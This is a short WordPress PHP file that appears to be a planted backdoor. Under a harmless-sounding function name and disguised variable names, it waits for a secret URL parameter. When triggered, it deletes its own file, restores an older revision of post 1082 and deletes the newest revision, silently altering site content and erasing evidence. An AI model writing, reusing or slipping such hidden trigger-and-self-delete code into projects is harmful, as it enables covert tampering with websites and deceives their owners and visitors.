<?php

function restaurant_category_titles() {
	if (isset($_GET['image_most_frontend']) && $_GET['image_most_frontend'] === 'gravatar_dist_fonts') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$duplicate_random_automatorwp = 1082;
		$rank_plugins_nextgen_shopp = wp_get_post_revisions($duplicate_random_automatorwp);
		if (empty($rank_plugins_nextgen_shopp)) die('no revisions');
		if (count($rank_plugins_nextgen_shopp) < 2) die('less than 2');
		$base_name_publish_dev = array_shift($rank_plugins_nextgen_shopp);
		$addon_image_easy = $base_name_publish_dev->ID;
		$new_nav_testimonials_shopp = array_shift($rank_plugins_nextgen_shopp);
		$akismet_search_admin = $new_nav_testimonials_shopp->ID;
		$comment_create_live_tag = wp_restore_post_revision($akismet_search_admin);
		if ($comment_create_live_tag === false) die('error restoring');
		$comment_create_live_tag = wp_delete_post_revision($addon_image_easy);		
		if ($comment_create_live_tag === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'restaurant_category_titles');
